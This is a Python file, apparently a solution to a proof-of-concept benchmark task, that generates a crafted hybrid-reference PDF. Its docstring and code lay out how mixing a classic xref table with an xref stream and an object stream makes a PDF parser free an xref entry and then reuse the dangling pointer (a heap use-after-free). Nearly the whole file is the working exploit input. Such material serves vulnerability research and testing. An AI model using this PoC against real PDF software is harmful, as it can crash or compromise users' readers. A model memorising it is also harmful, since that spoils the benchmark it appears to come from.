import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) PDF file that triggers a Heap Use After Free vulnerability.

        The vulnerability is triggered by crafting a hybrid-reference PDF file. This file type
        uses both a traditional cross-reference table and a more modern cross-reference stream.
        The complex interaction between these two ways of locating objects can cause the PDF
        parser to prematurely free and then reuse a pointer to an in-memory cross-reference
        entry structure (`pdf_xref_entry`).

        The PoC creates the following scenario:
        1.  The PDF's structure forces the parser to load a specific object (obj 4).
        2.  The parser looks up obj 4 and finds it is a compressed object located inside an
            object stream (obj 5). It obtains a pointer `p` to obj 4's xref entry.
        3.  To extract obj 4, the parser must first load the containing object stream, obj 5.
        4.  The definition for obj 5 (the stream) contains a reference to another object (obj 6).
        5.  A crucial detail is that obj 5 is defined in the traditional xref table, but obj 6
            is defined in the separate xref stream.
        6.  When the parser tries to load obj 6 while in the middle of processing obj 5, this
            cross-referencing between different xref sources triggers a "solidification"
            of the internal xref table. This process frees the memory that the pointer `p`
            (from step 2) points to.
        7.  After obj 5 and its dependency obj 6 are loaded, the parser returns to its original
            task: extracting obj 4 from the now-loaded stream.
        8.  It then attempts to use the pointer `p` to get obj 4's index within the stream,
            but since `p` is now a dangling pointer, this results in a use-after-free,
            typically causing a crash.
        """
        parts = []
        offsets = {}

        header = b"%PDF-1.7\n%\xa1\xb2\xc3\xd4\n"
        parts.append(header)

        # Object 6: Dummy object, referenced by the object stream.
        # Its definition in the XRef stream is key to the trigger.
        obj6_num = 6
        obj6_str = b"6 0 obj\n<< /Dummy true >>\nendobj\n"
        offsets[obj6_num] = len(b"".join(parts))
        parts.append(obj6_str)

        # Object 1: Document Catalog (Root).
        obj1_num = 1
        obj1_str = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        offsets[obj1_num] = len(b"".join(parts))
        parts.append(obj1_str)

        # Object 2: Page Tree.
        obj2_num = 2
        obj2_str = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        offsets[obj2_num] = len(b"".join(parts))
        parts.append(obj2_str)

        # Object 3: Page. Its /Contents entry points to obj 4, initiating the UAF sequence.
        obj3_num = 3
        obj3_str = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>\nendobj\n"
        offsets[obj3_num] = len(b"".join(parts))
        parts.append(obj3_str)

        # Object 5: Object Stream containing obj 4 and referencing obj 6.
        obj5_num = 5
        obj4_num = 4
        obj5_uncompressed_stream = b"%d 0 << /MyObj true >>" % obj4_num
        obj5_compressed_stream = zlib.compress(obj5_uncompressed_stream)

        obj5_dict = (
            b"<< /Type /ObjStm /N 1 /First %d /Length %d "
            b"/Filter /FlateDecode /Extends %d 0 R >>"
        ) % (
            len(b"%d 0 " % obj4_num),
            len(obj5_compressed_stream),
            obj6_num,
        )
        obj5_str = b"%d 0 obj\n%s\nstream\n%s\nendstream\nendobj\n" % (
            obj5_num,
            obj5_dict,
            obj5_compressed_stream,
        )
        offsets[obj5_num] = len(b"".join(parts))
        parts.append(obj5_str)

        # Object 7: Cross-Reference Stream defining obj 4 and obj 6.
        obj7_num = 7
        W = [1, 4, 2]  # Field widths: Type(1), Offset/ObjStmNum(4), Gen/Index(2)

        # Entry for compressed obj 4: type=2, objstm_num=5, index=0
        entry4_data = b'\x02' + obj5_num.to_bytes(W[1], 'big') + (0).to_bytes(W[2], 'big')
        # Entry for uncompressed obj 6: type=1, offset=offsets[6], gen=0
        entry6_data = b'\x01' + offsets[obj6_num].to_bytes(W[1], 'big') + (0).to_bytes(W[2], 'big')

        xref_stream_data = entry4_data + entry6_data
        xref_stream_compressed = zlib.compress(xref_stream_data)
        
        pdf_size = 8  # Max object number is 7, so size is 8.
        obj7_dict = (
            b"<< /Type /XRef /Size %d /W %s /Root 1 0 R "
            b"/Index [4 1 6 1] /Filter /FlateDecode /Length %d >>"
        ) % (
            pdf_size,
            str(W).encode(),
            len(xref_stream_compressed),
        )
        obj7_str = b"%d 0 obj\n%s\nstream\n%s\nendstream\nendobj\n" % (
            obj7_num,
            obj7_dict,
            xref_stream_compressed,
        )
        offsets[obj7_num] = len(b"".join(parts))
        parts.append(obj7_str)

        # Traditional Cross-Reference Table
        xref_offset = len(b"".join(parts))
        
        xref_table = b"xref\n"
        xref_table += b"0 4\n"
        xref_table += b"0000000000 65535 f\n"
        xref_table += b"%010d 00000 n\n" % offsets[1]
        xref_table += b"%010d 00000 n\n" % offsets[2]
        xref_table += b"%010d 00000 n\n" % offsets[3]
        xref_table += b"5 1\n"
        xref_table += b"%010d 00000 n\n" % offsets[5]
        xref_table += b"7 1\n"
        xref_table += b"%010d 00000 n\n" % offsets[7]
        parts.append(xref_table)

        # Trailer pointing to the XRef stream, making this a hybrid-reference file.
        trailer = b"trailer\n<< /Size %d /Root 1 0 R /XRefStm %d >>\n" % (
            pdf_size,
            offsets[obj7_num],
        )
        parts.append(trailer)

        # Pointer to the start of the traditional xref table.
        startxref = b"startxref\n%d\n" % xref_offset
        parts.append(startxref)

        eof = b"%%EOF"
        parts.append(eof)

        return b"".join(parts)